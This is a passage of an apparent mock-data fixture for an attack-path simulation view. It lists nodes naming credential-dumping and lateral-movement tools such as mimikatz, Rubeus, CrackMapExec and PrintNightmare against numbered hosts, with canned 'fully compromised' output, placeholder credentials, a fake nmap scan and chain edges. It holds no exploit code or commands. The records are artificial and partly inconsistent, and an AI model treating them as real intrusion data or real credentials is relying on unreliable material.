      node_accessed_files:['C:\\Logs\\API-86-audit.log'],
    },
    { node_id:'s5100EP-a87', node_type:'ACTION', node_label:'CrackMapExec → BACKUP-87',
      node_status:'undetected', node_hostname:'BACKUP-87', node_ip:'10.10.4.16',
      node_payload_name:'CrackMapExec', node_user_privileges:'CORP\\dev.user',
      node_executed_at:'2026-05-20 15:12:00 UTC', node_agent:'palo_alto',
      node_terminal_output:'[*] CrackMapExec → BACKUP-87 (10.10.4.16)\n[+] Shell obtained\n[+] Privilege escalated\n[+] Host fully compromised',
      node_credentials_found:['CORP\\backup87:P@ss87!'],
      node_accessed_files:['C:\\Logs\\BACKUP-87-audit.log'],
    },
    { node_id:'s5100EP-a88', node_type:'ACTION', node_label:'nmap-discovery → MONITOR-88',
      node_status:'undetected', node_hostname:'MONITOR-88', node_ip:'10.10.4.17',
      node_payload_name:'nmap-discovery', node_user_privileges:'NT AUTHORITY\\SYSTEM',
      node_executed_at:'2026-05-20 15:18:00 UTC', node_agent:'openaev',
      node_terminal_output:'[*] nmap-discovery → MONITOR-88 (10.10.4.17)\n[+] Shell obtained\n[+] Privilege escalated\n[+] Host fully compromised',
      node_credentials_found:['CORP\\monitor88:P@ss88!'],
      node_accessed_files:['C:\\Logs\\MONITOR-88-audit.log'],
    },
    { node_id:'s5100EP-a89', node_type:'ACTION', node_label:'PowerView-recon → VPN-89',
      node_status:'undetected', node_hostname:'VPN-89', node_ip:'10.10.4.18',
      node_payload_name:'PowerView-recon', node_user_privileges:'CORP\\net.monitor',
      node_executed_at:'2026-05-20 15:20:00 UTC', node_agent:'palo_alto',
      node_terminal_output:'[*] PowerView-recon → VPN-89 (10.10.4.18)\n[+] Shell obtained\n[+] Privilege escalated\n[+] Host fully compromised',
      node_credentials_found:['CORP\\vpn89:P@ss89!'],
      node_accessed_files:['C:\\Logs\\VPN-89-audit.log'],
    },
    { node_id:'s5100EP-a90', node_type:'ACTION', node_label:'wdigest-dump → SIEM-90',
      node_status:'prevented', node_hostname:'SIEM-90', node_ip:'10.10.4.19',
      node_payload_name:'wdigest-dump', node_user_privileges:'NT AUTHORITY\\SYSTEM',
      node_executed_at:'2026-05-20 15:25:00 UTC', node_agent:'openaev',
      node_terminal_output:'[*] wdigest-dump → SIEM-90 (10.10.4.19)\n[-] BLOCKED by endpoint protection\n[!] Prevented at SIEM-90',
      node_expectations:[{expectation_id:'s5100EP-e89',expectation_type:'PREVENTION',expectation_status:'SUCCEEDED',expectation_score:100,expectation_expected_score:100}],
    },
    { node_id:'s5100EP-a91', node_type:'ACTION', node_label:'reg-sam-dump → WEB-91',
      node_status:'undetected', node_hostname:'WEB-91', node_ip:'10.10.4.20',
      node_payload_name:'reg-sam-dump', node_user_privileges:'CORP\\it.admin',
      node_executed_at:'2026-05-20 15:32:00 UTC', node_agent:'sentinel_one',
      node_terminal_output:'[*] reg-sam-dump → WEB-91 (10.10.4.20)\n[+] Shell obtained\n[+] Privilege escalated\n[+] Host fully compromised',
      node_credentials_found:['CORP\\web91:P@ss91!'],
      node_accessed_files:['C:\\Logs\\WEB-91-audit.log'],
    },
    { node_id:'s5100EP-a92', node_type:'ACTION', node_label:'CrackMapExec → APP-92',
      node_status:'undetected', node_hostname:'APP-92', node_ip:'10.10.4.21',
      node_payload_name:'CrackMapExec', node_user_privileges:'CORP\\net.monitor',
      node_executed_at:'2026-05-20 15:38:00 UTC', node_agent:'sentinel_one',
      node_terminal_output:'[*] CrackMapExec → APP-92 (10.10.4.21)\n[+] Shell obtained\n[+] Privilege escalated\n[+] Host fully compromised',
      node_credentials_found:['CORP\\app92:P@ss92!'],
      node_accessed_files:['C:\\Logs\\APP-92-audit.log'],
    },
    { node_id:'s5100EP-a93', node_type:'ACTION', node_label:'Rubeus-asktgt → DB-93',
      node_status:'undetected', node_hostname:'DB-93', node_ip:'10.10.4.22',
      node_payload_name:'Rubeus-asktgt', node_user_privileges:'CORP\\svc_tomcat',
      node_executed_at:'2026-05-20 15:41:00 UTC', node_agent:'palo_alto',
      node_terminal_output:'[*] Rubeus-asktgt → DB-93 (10.10.4.22)\n[+] Shell obtained\n[+] Privilege escalated\n[+] Host fully compromised',
      node_credentials_found:['CORP\\db93:P@ss93!'],
      node_accessed_files:['C:\\Logs\\DB-93-audit.log'],
    },
    { node_id:'s5100EP-a94', node_type:'ACTION', node_label:'wdigest-dump → FILE-94',
      node_status:'undetected', node_hostname:'FILE-94', node_ip:'10.10.4.23',
      node_payload_name:'wdigest-dump', node_user_privileges:'CORP\\dev.user',
      node_executed_at:'2026-05-20 15:45:00 UTC', node_agent:'palo_alto',
      node_terminal_output:'[*] wdigest-dump → FILE-94 (10.10.4.23)\n[+] Shell obtained\n[+] Privilege escalated\n[+] Host fully compromised',
      node_credentials_found:['CORP\\file94:P@ss94!'],
      node_accessed_files:['C:\\Logs\\FILE-94-audit.log'],
    },
    { node_id:'s5100EP-a95', node_type:'ACTION', node_label:'psexec-lateral → MAIL-95',
      node_status:'undetected', node_hostname:'MAIL-95', node_ip:'10.10.4.24',
      node_payload_name:'psexec-lateral', node_user_privileges:'CORP\\it.admin',
      node_executed_at:'2026-05-20 15:50:00 UTC', node_agent:'palo_alto',
      node_terminal_output:'[*] psexec-lateral → MAIL-95 (10.10.4.24)\n[+] Shell obtained\n[+] Privilege escalated\n[+] Host fully compromised',
      node_credentials_found:['CORP\\mail95:P@ss95!'],
      node_accessed_files:['C:\\Logs\\MAIL-95-audit.log'],
    },
    { node_id:'s5100EP-a96', node_type:'ACTION', node_label:'mimikatz-sekurlsa → JUMP-96',
      node_status:'undetected', node_hostname:'JUMP-96', node_ip:'10.10.4.25',
      node_payload_name:'mimikatz-sekurlsa', node_user_privileges:'CORP\\it.admin',
      node_executed_at:'2026-05-20 15:58:00 UTC', node_agent:'openaev',
      node_terminal_output:'[*] mimikatz-sekurlsa → JUMP-96 (10.10.4.25)\n[+] Shell obtained\n[+] Privilege escalated\n[+] Host fully compromised',
      node_credentials_found:['CORP\\jump96:P@ss96!'],
      node_accessed_files:['C:\\Logs\\JUMP-96-audit.log'],
    },
    { node_id:'s5100EP-a97', node_type:'ACTION', node_label:'wdigest-dump → PRINT-97',
      node_status:'undetected', node_hostname:'PRINT-97', node_ip:'10.10.4.26',
      node_payload_name:'wdigest-dump', node_user_privileges:'CORP\\dev.user',
      node_executed_at:'2026-05-20 16:03:00 UTC', node_agent:'palo_alto',
      node_terminal_output:'[*] wdigest-dump → PRINT-97 (10.10.4.26)\n[+] Shell obtained\n[+] Privilege escalated\n[+] Host fully compromised',
      node_credentials_found:['CORP\\print97:P@ss97!'],
      node_accessed_files:['C:\\Logs\\PRINT-97-audit.log'],
    },
    { node_id:'s5100EP-a98', node_type:'ACTION', node_label:'mimikatz-sekurlsa → DNS-98',
      node_status:'detected', node_hostname:'DNS-98', node_ip:'10.10.4.27',
      node_payload_name:'mimikatz-sekurlsa', node_user_privileges:'CORP\\it.admin',
      node_executed_at:'2026-05-20 16:08:00 UTC', node_agent:'openaev',
      node_terminal_output:'[*] mimikatz-sekurlsa → DNS-98 (10.10.4.27)\n[+] Connected\n[!] ALERT — session terminated by SOC',
      node_credentials_found:['CORP\\dns98:P@ss98!'],
      node_accessed_files:['C:\\Logs\\DNS-98-audit.log'],
      node_expectations:[{expectation_id:'s5100EP-e97',expectation_type:'DETECTION',expectation_status:'SUCCEEDED',expectation_score:100,expectation_expected_score:100}],
    },
    { node_id:'s5100EP-a99', node_type:'ACTION', node_label:'PrintNightmare-LPE → DC-99',
      node_status:'undetected', node_hostname:'DC-99', node_ip:'10.10.4.28',
      node_payload_name:'PrintNightmare-LPE', node_user_privileges:'CORP\\it.admin',
      node_executed_at:'2026-05-20 16:13:00 UTC', node_agent:'sentinel_one',
      node_terminal_output:'[*] PrintNightmare-LPE → DC-99 (10.10.4.28)\n[+] Shell obtained\n[+] Privilege escalated\n[+] Host fully compromised',
      node_credentials_found:['CORP\\dc99:P@ss99!'],
      node_accessed_files:['C:\\Logs\\DC-99-audit.log'],
    },
    { node_id:'s5100EP-a100', node_type:'ACTION', node_label:'wdigest-dump → WS-100',
      node_status:'undetected', node_hostname:'WS-100', node_ip:'10.10.4.29',
      node_payload_name:'wdigest-dump', node_user_privileges:'CORP\\domain_admin',
      node_executed_at:'2026-05-20 16:15:00 UTC', node_agent:'openaev',
      node_terminal_output:'[*] wdigest-dump → WS-100 (10.10.4.29)\n[+] Shell obtained\n[+] Privilege escalated\n[+] Host fully compromised',
      node_credentials_found:['CORP\\ws100:P@ss100!'],
      node_accessed_files:['C:\\Logs\\WS-100-audit.log'],
    },
    {
      node_id: 's5100EP-a-nmap-bulk', node_type: 'ACTION', node_label: 'Nmap Full-Network Discovery',
      node_status: 'undetected', node_ip: '0.0.0.0/0',
      node_payload_name: 'nmap – TCP SYN Scan (full network)',
      node_executed_at: '2026-05-20 07:55:00 UTC',
      node_agent: 'openaev',
      node_terminal_output: `Starting Nmap 7.94 at 2026-05-20 07:55 UTC
Nmap scan report for 172.16.0.10
HOST: up
22/tcp  open  ssh
80/tcp  open  http
443/tcp open  ssl/https

Nmap scan report for 172.16.0.11
HOST: up
135/tcp open  msrpc
445/tcp open  microsoft-ds

Nmap scan report for 172.16.0.12
HOST: up
22/tcp  open  ssh
8080/tcp open  http

Nmap scan report for 172.16.0.13
HOST: up
22/tcp  open  ssh
8443/tcp open  https-alt

Nmap scan report for 172.16.0.14
HOST: up
135/tcp open  msrpc
3389/tcp open  ms-wbt-server

Nmap scan report for 172.16.0.15
HOST: up
22/tcp  open  ssh
5432/tcp open  postgresql

Nmap scan report for 172.16.0.16
HOST: up
22/tcp  open  ssh
3306/tcp open  mysql

Nmap scan report for 172.16.0.17
HOST: up
22/tcp  open  ssh
9200/tcp open  elasticsearch

Nmap scan report for 172.16.0.18
HOST: up
22/tcp  open  ssh
5601/tcp open  kibana

Nmap scan report for 172.16.0.19
HOST: up
135/tcp open  msrpc
445/tcp open  microsoft-ds

Nmap scan report for 172.16.0.20
HOST: up
22/tcp  open  ssh
873/tcp open  rsync

Nmap scan report for 172.16.0.21
HOST: up
135/tcp open  msrpc
1433/tcp open  ms-sql-s

Nmap scan report for 172.16.0.22
HOST: up
53/tcp  open  domain
389/tcp open  ldap
445/tcp open  microsoft-ds

Nmap scan report for 172.16.0.23
HOST: up
22/tcp  open  ssh
2049/tcp open  nfs

Nmap scan report for 172.16.0.24
HOST: up
135/tcp open  msrpc
445/tcp open  microsoft-ds

Nmap scan report for 172.16.0.25
HOST: up
22/tcp  open  ssh
8080/tcp open  http

Nmap scan report for 172.16.0.26
HOST: up
53/tcp  open  domain
88/tcp  open  kerberos-sec
445/tcp open  microsoft-ds

Nmap scan report for 172.16.0.27
HOST: up
22/tcp  open  ssh
6379/tcp open  redis

Nmap scan report for 172.16.0.28
HOST: up
22/tcp  open  ssh
27017/tcp open  mongodb

Nmap scan report for 172.16.0.29
HOST: up
22/tcp  open  ssh
9092/tcp open  kafka

Nmap scan report for 10.10.1.70
HOST: up
135/tcp open  msrpc
445/tcp open  microsoft-ds
3389/tcp open  ms-wbt-server

Nmap scan report for 10.10.1.71
HOST: up
135/tcp open  msrpc
445/tcp open  microsoft-ds

Nmap scan report for 10.10.1.72
HOST: up
22/tcp  open  ssh
8080/tcp open  http

Nmap scan report for 10.10.1.73
HOST: up
22/tcp  open  ssh
5432/tcp open  postgresql

Nmap scan report for 10.10.1.74
HOST: up
22/tcp  open  ssh
3306/tcp open  mysql

Nmap scan report for 10.10.1.75
HOST: up
135/tcp open  msrpc
445/tcp open  microsoft-ds

Nmap scan report for 10.10.1.76
HOST: up
22/tcp  open  ssh
9200/tcp open  elasticsearch

Nmap scan report for 10.10.1.77
HOST: up
22/tcp  open  ssh
8443/tcp open  https-alt

Nmap scan report for 10.10.1.78
HOST: up
22/tcp  open  ssh
873/tcp open  rsync

Nmap scan report for 10.10.1.79
HOST: up
135/tcp open  msrpc
1433/tcp open  ms-sql-s

Nmap scan report for 10.10.1.80
HOST: up
135/tcp open  msrpc
445/tcp open  microsoft-ds

Nmap scan report for 10.10.1.81
HOST: up
22/tcp  open  ssh
5432/tcp open  postgresql

Nmap scan report for 10.10.1.82
HOST: up
22/tcp  open  ssh
3306/tcp open  mysql

Nmap scan report for 10.10.1.83
HOST: up
135/tcp open  msrpc
3389/tcp open  ms-wbt-server

Nmap scan report for 10.10.1.84
HOST: up
53/tcp  open  domain
88/tcp  open  kerberos-sec
445/tcp open  microsoft-ds

Nmap scan report for 10.10.1.85
HOST: up
22/tcp  open  ssh
8080/tcp open  http

Nmap scan report for 10.10.1.86
HOST: up
22/tcp  open  ssh
9200/tcp open  elasticsearch

Nmap scan report for 10.10.1.87
HOST: up
22/tcp  open  ssh
2049/tcp open  nfs

Nmap scan report for 10.10.1.88
HOST: up
135/tcp open  msrpc
445/tcp open  microsoft-ds

Nmap scan report for 10.10.1.89
HOST: up
22/tcp  open  ssh
6379/tcp open  redis

Nmap scan report for 10.10.2.50
HOST: up
22/tcp  open  ssh
8080/tcp open  http

Nmap scan report for 10.10.2.51
HOST: up
135/tcp open  msrpc
445/tcp open  microsoft-ds

Nmap scan report for 10.10.2.52
HOST: up
135/tcp open  msrpc
3389/tcp open  ms-wbt-server

Nmap scan report for 10.10.2.53
HOST: up
22/tcp  open  ssh
5432/tcp open  postgresql

Nmap scan report for 10.10.2.54
HOST: up
135/tcp open  msrpc
1433/tcp open  ms-sql-s

Nmap scan report for 10.10.2.55
HOST: up
135/tcp open  msrpc
3389/tcp open  ms-wbt-server

Nmap scan report for 10.10.2.56
HOST: up
22/tcp  open  ssh
8443/tcp open  https-alt

Nmap scan report for 10.10.2.57
HOST: up
22/tcp  open  ssh
9200/tcp open  elasticsearch

Nmap scan report for 10.10.2.58
HOST: up
22/tcp  open  ssh
3306/tcp open  mysql

Nmap scan report for 10.10.2.59
HOST: up
22/tcp  open  ssh
873/tcp open  rsync

Nmap scan report for 10.10.2.60
HOST: up
22/tcp  open  ssh
2049/tcp open  nfs

Nmap scan report for 10.10.2.61
HOST: up
135/tcp open  msrpc
445/tcp open  microsoft-ds

Nmap scan report for 10.10.2.62
HOST: up
22/tcp  open  ssh
8080/tcp open  http

Nmap scan report for 10.10.2.63
HOST: up
53/tcp  open  domain
88/tcp  open  kerberos-sec
445/tcp open  microsoft-ds

Nmap scan report for 10.10.2.64
HOST: up
135/tcp open  msrpc
445/tcp open  microsoft-ds

Nmap scan report for 10.10.2.65
HOST: up
22/tcp  open  ssh
5601/tcp open  kibana

Nmap scan report for 10.10.2.66
HOST: up
135/tcp open  msrpc
3389/tcp open  ms-wbt-server

Nmap scan report for 10.10.2.67
HOST: up
135/tcp open  msrpc
445/tcp open  microsoft-ds

Nmap scan report for 10.10.2.68
HOST: up
22/tcp  open  ssh
22/tcp  open  ssh

Nmap scan report for 10.10.2.69
HOST: up
22/tcp  open  ssh
8080/tcp open  http

Nmap scan report for 10.10.3.20
HOST: up
22/tcp  open  ssh
9200/tcp open  elasticsearch

Nmap scan report for 10.10.3.21
HOST: up
135/tcp open  msrpc
445/tcp open  microsoft-ds

Nmap scan report for 10.10.3.22
HOST: up
135/tcp open  msrpc
3389/tcp open  ms-wbt-server

Nmap scan report for 10.10.3.23
HOST: up
22/tcp  open  ssh
8080/tcp open  http

Nmap scan report for 10.10.3.24
HOST: up
53/tcp  open  domain
88/tcp  open  kerberos-sec
445/tcp open  microsoft-ds

Nmap scan report for 10.10.3.25
HOST: up
22/tcp  open  ssh
5432/tcp open  postgresql

Nmap scan report for 10.10.3.26
HOST: up
22/tcp  open  ssh
3306/tcp open  mysql

Nmap scan report for 10.10.3.27
HOST: up
135/tcp open  msrpc
3389/tcp open  ms-wbt-server

Nmap scan report for 10.10.3.28
HOST: up
135/tcp open  msrpc
445/tcp open  microsoft-ds

Nmap scan report for 10.10.3.29
HOST: up
22/tcp  open  ssh
8443/tcp open  https-alt

Nmap scan report for 10.10.3.30
HOST: up
22/tcp  open  ssh
9200/tcp open  elasticsearch

Nmap scan report for 10.10.3.31
HOST: up
22/tcp  open  ssh
873/tcp open  rsync

Nmap scan report for 10.10.3.32
HOST: up
135/tcp open  msrpc
3389/tcp open  ms-wbt-server

Nmap scan report for 10.10.3.33
HOST: up
22/tcp  open  ssh
5432/tcp open  postgresql

Nmap scan report for 10.10.3.34
HOST: up
135/tcp open  msrpc
445/tcp open  microsoft-ds

Nmap scan report for 10.10.3.35
HOST: up
22/tcp  open  ssh
8080/tcp open  http

Nmap scan report for 10.10.3.36
HOST: up
135/tcp open  msrpc
1433/tcp open  ms-sql-s

Nmap scan report for 10.10.3.37
HOST: up
22/tcp  open  ssh
2049/tcp open  nfs

Nmap scan report for 10.10.3.38
HOST: up
135/tcp open  msrpc
3389/tcp open  ms-wbt-server

Nmap scan report for 10.10.3.39
HOST: up
22/tcp  open  ssh
6379/tcp open  redis

Nmap scan report for 10.10.4.10
HOST: up
22/tcp  open  ssh
8080/tcp open  http

Nmap scan report for 10.10.4.11
HOST: up
22/tcp  open  ssh
9200/tcp open  elasticsearch

Nmap scan report for 10.10.4.12
HOST: up
53/tcp  open  domain
88/tcp  open  kerberos-sec
445/tcp open  microsoft-ds

Nmap scan report for 10.10.4.13
HOST: up
135/tcp open  msrpc
1433/tcp open  ms-sql-s

Nmap scan report for 10.10.4.14
HOST: up
135/tcp open  msrpc
445/tcp open  microsoft-ds

Nmap scan report for 10.10.4.15
HOST: up
135/tcp open  msrpc
3389/tcp open  ms-wbt-server

Nmap scan report for 10.10.4.16
HOST: up
135/tcp open  msrpc
445/tcp open  microsoft-ds

Nmap scan report for 10.10.4.17
HOST: up
135/tcp open  msrpc
3389/tcp open  ms-wbt-server

Nmap scan report for 10.10.4.18
HOST: up
22/tcp  open  ssh
5432/tcp open  postgresql

Nmap scan report for 10.10.4.19
HOST: up
22/tcp  open  ssh
3306/tcp open  mysql

Nmap scan report for 10.10.4.20
HOST: up
135/tcp open  msrpc
445/tcp open  microsoft-ds

Nmap scan report for 10.10.4.21
HOST: up
53/tcp  open  domain
88/tcp  open  kerberos-sec
445/tcp open  microsoft-ds

Nmap scan report for 10.10.4.22
HOST: up
22/tcp  open  ssh
8080/tcp open  http

Nmap scan report for 10.10.4.23
HOST: up
22/tcp  open  ssh
9200/tcp open  elasticsearch

Nmap scan report for 10.10.4.24
HOST: up
135/tcp open  msrpc
3389/tcp open  ms-wbt-server

Nmap scan report for 10.10.4.25
HOST: up
22/tcp  open  ssh
5432/tcp open  postgresql

Nmap scan report for 10.10.4.26
HOST: up
135/tcp open  msrpc
445/tcp open  microsoft-ds

Nmap scan report for 10.10.4.27
HOST: up
135/tcp open  msrpc
3389/tcp open  ms-wbt-server

Nmap scan report for 10.10.4.28
HOST: up
22/tcp  open  ssh
8443/tcp open  https-alt

Nmap scan report for 10.10.4.29
HOST: up
135/tcp open  msrpc
445/tcp open  microsoft-ds

Nmap done: 254 IP addresses (100 hosts up) scanned in 112.6 seconds`,
    },
  ],
  attack_path_edges:[
    {edge_id:'s5100EP-c01',edge_source:'s5100EP-a01',edge_target:'s5100EP-a02',edge_type:'chain_flow', edge_label:'foothold → lateral'},
    {edge_id:'s5100EP-c02',edge_source:'s5100EP-a02',edge_target:'s5100EP-a03',edge_type:'chain_flow'},
    {edge_id:'s5100EP-c03',edge_source:'s5100EP-a03',edge_target:'s5100EP-a04',edge_type:'chain_flow'},
    {edge_id:'s5100EP-c04',edge_source:'s5100EP-a04',edge_target:'s5100EP-a05',edge_type:'chain_flow'},
    {edge_id:'s5100EP-c05',edge_source:'s5100EP-a05',edge_target:'s5100EP-a06',edge_type:'chain_flow'},
    {edge_id:'s5100EP-c06',edge_source:'s5100EP-a06',edge_target:'s5100EP-a07',edge_type:'chain_flow'},
    {edge_id:'s5100EP-c07',edge_source:'s5100EP-a07',edge_target:'s5100EP-a08',edge_type:'chain_flow'},
    {edge_id:'s5100EP-c08',edge_source:'s5100EP-a08',edge_target:'s5100EP-a09',edge_type:'chain_flow'},
    {edge_id:'s5100EP-c09',edge_source:'s5100EP-a09',edge_target:'s5100EP-a10',edge_type:'chain_flow'},
    {edge_id:'s5100EP-c10',edge_source:'s5100EP-a10',edge_target:'s5100EP-a11',edge_type:'chain_flow'},
    {edge_id:'s5100EP-c11',edge_source:'s5100EP-a11',edge_target:'s5100EP-a12',edge_type:'chain_flow'},
    {edge_id:'s5100EP-c12',edge_source:'s5100EP-a12',edge_target:'s5100EP-a13',edge_type:'chain_flow'},
    {edge_id:'s5100EP-c13',edge_source:'s5100EP-a13',edge_target:'s5100EP-a14',edge_type:'chain_flow'},
    {edge_id:'s5100EP-c14',edge_source:'s5100EP-a14',edge_target:'s5100EP-a15',edge_type:'chain_flow'},
    {edge_id:'s5100EP-c15',edge_source:'s5100EP-a15',edge_target:'s5100EP-a16',edge_type:'chain_flow'},
    {edge_id:'s5100EP-c16',edge_source:'s5100EP-a16',edge_target:'s5100EP-a17',edge_type:'chain_flow'},
    {edge_id:'s5100EP-c17',edge_source:'s5100EP-a17',edge_target:'s5100EP-a18',edge_type:'chain_flow'},
    {edge_id:'s5100EP-c18',edge_source:'s5100EP-a18',edge_target:'s5100EP-a19',edge_type:'chain_flow'},
    {edge_id:'s5100EP-c19',edge_source:'s5100EP-a19',edge_target:'s5100EP-a20',edge_type:'chain_flow'},
    {edge_id:'s5100EP-c20',edge_source:'s5100EP-a20',edge_target:'s5100EP-a21',edge_type:'chain_flow'},
    {edge_id:'s5100EP-c21',edge_source:'s5100EP-a21',edge_target:'s5100EP-a22',edge_type:'chain_flow'},
    {edge_id:'s5100EP-c22',edge_source:'s5100EP-a22',edge_target:'s5100EP-a23',edge_type:'chain_flow'},
    {edge_id:'s5100EP-c23',edge_source:'s5100EP-a23',edge_target:'s5100EP-a24',edge_type:'chain_flow'},
    {edge_id:'s5100EP-c24',edge_source:'s5100EP-a24',edge_target:'s5100EP-a25',edge_type:'chain_flow'},
    {edge_id:'s5100EP-c25',edge_source:'s5100EP-a25',edge_target:'s5100EP-a26',edge_type:'chain_flow'},
    {edge_id:'s5100EP-c26',edge_source:'s5100EP-a26',edge_target:'s5100EP-a27',edge_type:'chain_flow'},
    {edge_id:'s5100EP-c27',edge_source:'s5100EP-a27',edge_target:'s5100EP-a28',edge_type:'chain_flow'},
    {edge_id:'s5100EP-c28',edge_source:'s5100EP-a28',edge_target:'s5100EP-a29',edge_type:'chain_flow'},
    {edge_id:'s5100EP-c29',edge_source:'s5100EP-a29',edge_target:'s5100EP-a30',edge_type:'chain_flow'},
    {edge_id:'s5100EP-c30',edge_source:'s5100EP-a30',edge_target:'s5100EP-a31',edge_type:'chain_flow'},
    {edge_id:'s5100EP-c31',edge_source:'s5100EP-a31',edge_target:'s5100EP-a32',edge_type:'chain_flow'},
    {edge_id:'s5100EP-c32',edge_source:'s5100EP-a32',edge_target:'s5100EP-a33',edge_type:'chain_flow'},
    {edge_id:'s5100EP-c33',edge_source:'s5100EP-a33',edge_target:'s5100EP-a34',edge_type:'chain_flow'},
    {edge_id:'s5100EP-c34',edge_source:'s5100EP-a34',edge_target:'s5100EP-a35',edge_type:'chain_flow'},
    {edge_id:'s5100EP-c35',edge_source:'s5100EP-a35',edge_target:'s5100EP-a36',edge_type:'chain_flow'},
    {edge_id:'s5100EP-c36',edge_source:'s5100EP-a36',edge_target:'s5100EP-a37',edge_type:'chain_flow'},
    {edge_id:'s5100EP-c37',edge_source:'s5100EP-a37',edge_target:'s5100EP-a38',edge_type:'chain_flow'},
    {edge_id:'s5100EP-c38',edge_source:'s5100EP-a38',edge_target:'s5100EP-a39',edge_type:'chain_flow'},
    {edge_id:'s5100EP-c39',edge_source:'s5100EP-a39',edge_target:'s5100EP-a40',edge_type:'chain_flow'},
    {edge_id:'s5100EP-c40',edge_source:'s5100EP-a40',edge_target:'s5100EP-a41',edge_type:'chain_flow'},
    {edge_id:'s5100EP-c41',edge_source:'s5100EP-a41',edge_target:'s5100EP-a42',edge_type:'chain_flow'},
    {edge_id:'s5100EP-c42',edge_source:'s5100EP-a42',edge_target:'s5100EP-a43',edge_type:'chain_flow'},
    {edge_id:'s5100EP-c43',edge_source:'s5100EP-a43',edge_target:'s5100EP-a44',edge_type:'chain_flow'},
    {edge_id:'s5100EP-c44',edge_source:'s5100EP-a44',edge_target:'s5100EP-a45',edge_type:'chain_flow'},
    {edge_id:'s5100EP-c45',edge_source:'s5100EP-a45',edge_target:'s5100EP-a46',edge_type:'chain_flow'},
    {edge_id:'s5100EP-c46',edge_source:'s5100EP-a46',edge_target:'s5100EP-a47',edge_type:'chain_flow'},
    {edge_id:'s5100EP-c47',edge_source:'s5100EP-a47',edge_target:'s5100EP-a48',edge_type:'chain_flow'},
    {edge_id:'s5100EP-c48',edge_source:'s5100EP-a48',edge_target:'s5100EP-a49',edge_type:'chain_flow'},
    {edge_id:'s5100EP-c49',edge_source:'s5100EP-a49',edge_target:'s5100EP-a50',edge_type:'chain_flow'},
    {edge_id:'s5100EP-c50',edge_source:'s5100EP-a50',edge_target:'s5100EP-a51',edge_type:'chain_flow'},
    {edge_id:'s5100EP-c51',edge_source:'s5100EP-a51',edge_target:'s5100EP-a52',edge_type:'chain_flow'},
    {edge_id:'s5100EP-c52',edge_source:'s5100EP-a52',edge_target:'s5100EP-a53',edge_type:'chain_flow'},
    {edge_id:'s5100EP-c53',edge_source:'s5100EP-a53',edge_target:'s5100EP-a54',edge_type:'chain_flow'},
    {edge_id:'s5100EP-c54',edge_source:'s5100EP-a54',edge_target:'s5100EP-a55',edge_type:'chain_flow'},
    {edge_id:'s5100EP-c55',edge_source:'s5100EP-a55',edge_target:'s5100EP-a56',edge_type:'chain_flow'},
    {edge_id:'s5100EP-c56',edge_source:'s5100EP-a56',edge_target:'s5100EP-a57',edge_type:'chain_flow'},
    {edge_id:'s5100EP-c57',edge_source:'s5100EP-a57',edge_target:'s5100EP-a58',edge_type:'chain_flow'},
    {edge_id:'s5100EP-c58',edge_source:'s5100EP-a58',edge_target:'s5100EP-a59',edge_type:'chain_flow'},
    {edge_id:'s5100EP-c59',edge_source:'s5100EP-a59',edge_target:'s5100EP-a60',edge_type:'chain_flow'},
    {edge_id:'s5100EP-c60',edge_source:'s5100EP-a60',edge_target:'s5100EP-a61',edge_type:'chain_flow'},
    {edge_id:'s5100EP-c61',edge_source:'s5100EP-a61',edge_target:'s5100EP-a62',edge_type:'chain_flow'},
    {edge_id:'s5100EP-c62',edge_source:'s5100EP-a62',edge_target:'s5100EP-a63',edge_type:'chain_flow'},
    {edge_id:'s5100EP-c63',edge_source:'s5100EP-a63',edge_target:'s5100EP-a64',edge_type:'chain_flow'},
    {edge_id:'s5100EP-c64',edge_source:'s5100EP-a64',edge_target:'s5100EP-a65',edge_type:'chain_flow'},
    {edge_id:'s5100EP-c65',edge_source:'s5100EP-a65',edge_target:'s5100EP-a66',edge_type:'chain_flow'},
    {edge_id:'s5100EP-c66',edge_source:'s5100EP-a66',edge_target:'s5100EP-a67',edge_type:'chain_flow'},
    {edge_id:'s5100EP-c67',edge_source:'s5100EP-a67',edge_target:'s5100EP-a68',edge_type:'chain_flow'},
    {edge_id:'s5100EP-c68',edge_source:'s5100EP-a68',edge_target:'s5100EP-a69',edge_type:'chain_flow'},
    {edge_id:'s5100EP-c69',edge_source:'s5100EP-a69',edge_target:'s5100EP-a70',edge_type:'chain_flow'},
    {edge_id:'s5100EP-c70',edge_source:'s5100EP-a70',edge_target:'s5100EP-a71',edge_type:'chain_flow'},
    {edge_id:'s5100EP-c71',edge_source:'s5100EP-a71',edge_target:'s5100EP-a72',edge_type:'chain_flow'},
    {edge_id:'s5100EP-c72',edge_source:'s5100EP-a72',edge_target:'s5100EP-a73',edge_type:'chain_flow'},
    {edge_id:'s5100EP-c73',edge_source:'s5100EP-a73',edge_target:'s5100EP-a74',edge_type:'chain_flow'},
    {edge_id:'s5100EP-c74',edge_source:'s5100EP-a74',edge_target:'s5100EP-a75',edge_type:'chain_flow'},
    {edge_id:'s5100EP-c75',edge_source:'s5100EP-a75',edge_target:'s5100EP-a76',edge_type:'chain_flow'},
    {edge_id:'s5100EP-c76',edge_source:'s5100EP-a76',edge_target:'s5100EP-a77',edge_type:'chain_flow'},
    {edge_id:'s5100EP-c77',edge_source:'s5100EP-a77',edge_target:'s5100EP-a78',edge_type:'chain_flow'},
    {edge_id:'s5100EP-c78',edge_source:'s5100EP-a78',edge_target:'s5100EP-a79',edge_type:'chain_flow'},
    {edge_id:'s5100EP-c79',edge_source:'s5100EP-a79',edge_target:'s5100EP-a80',edge_type:'chain_flow'},
    {edge_id:'s5100EP-c80',edge_source:'s5100EP-a80',edge_target:'s5100EP-a81',edge_type:'chain_flow'},
    {edge_id:'s5100EP-c81',edge_source:'s5100EP-a81',edge_target:'s5100EP-a82',edge_type:'chain_flow'},
    {edge_id:'s5100EP-c82',edge_source:'s5100EP-a82',edge_target:'s5100EP-a83',edge_type:'chain_flow'},
    {edge_id:'s5100EP-c83',edge_source:'s5100EP-a83',edge_target:'s5100EP-a84',edge_type:'chain_flow'},
    {edge_id:'s5100EP-c84',edge_source:'s5100EP-a84',edge_target:'s5100EP-a85',edge_type:'chain_flow'},
    {edge_id:'s5100EP-c85',edge_source:'s5100EP-a85',edge_target:'s5100EP-a86',edge_type:'chain_flow'},
    {edge_id:'s5100EP-c86',edge_source:'s5100EP-a86',edge_target:'s5100EP-a87',edge_type:'chain_flow'},
    {edge_id:'s5100EP-c87',edge_source:'s5100EP-a87',edge_target:'s5100EP-a88',edge_type:'chain_flow'},
    {edge_id:'s5100EP-c88',edge_source:'s5100EP-a88',edge_target:'s5100EP-a89',edge_type:'chain_flow'},
